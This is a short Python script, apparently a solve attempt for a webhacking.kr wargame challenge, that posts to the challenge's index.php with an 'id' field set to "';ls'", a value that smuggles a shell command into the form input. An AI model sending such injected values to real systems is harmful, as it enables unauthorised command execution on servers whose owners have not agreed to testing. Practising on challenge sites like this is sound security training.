import requests

res = requests.post('http://webhacking.kr:10005/index.php', data = {'id':"';ls'"})
print(res.text)
